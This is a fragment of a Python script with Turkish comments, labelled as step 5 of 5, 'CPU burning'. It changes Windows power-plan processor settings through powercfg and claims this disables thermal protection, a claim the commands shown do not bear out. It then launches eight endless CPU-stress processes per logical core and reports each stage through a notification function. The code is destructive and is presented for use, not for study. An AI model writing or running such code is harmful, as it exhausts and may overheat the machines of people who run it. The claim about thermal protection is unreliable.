# ==========================================
# 5) CPU YAKMA (LİMİT - 8 KATI)
# ==========================================
def cpu_stress():
    while True:
        for _ in range(10000):
            _ = 3.14159 ** 3.14159
            _ = 999999 * 999999
            _ = 999999 ** 2
            _ = 999999 * 999999 * 999999
        for _ in range(5000):
            arr = [i ** i for i in range(1000)]
            arr.sort()
            arr.reverse()

def kill_cpu():
    send_notification("🔥 [5/5] CPU LİMİT yakılıyor...")
    try:
        subprocess.run('powercfg -setacvalueindex SCHEME_CURRENT SUB_PROCESSOR PERFINCPOL 2', shell=True, capture_output=True)
        subprocess.run('powercfg -setacvalueindex SCHEME_CURRENT SUB_PROCESSOR PERFDECPOL 1', shell=True, capture_output=True)
        subprocess.run('powercfg -setactive SCHEME_CURRENT', shell=True, capture_output=True)
        send_notification("🔥 Termal koruma kapatıldı!")

        core_count = os.cpu_count()
        process_count = core_count * 8  # 8 KATI
        send_notification(f"🧠 CPU: {core_count} mantıksal çekirdek, {process_count} işlem (8 katı)")

        processes = []
        for _ in range(process_count):
            p = Process(target=cpu_stress)
            p.start()
            processes.append(p)

        send_notification(f"✅ CPU {process_count} işlem ile LİMİT yakılıyor!")
        return True
    except Exception as e:
        send_notification(f"❌ CPU hatası: {e}")
        return False

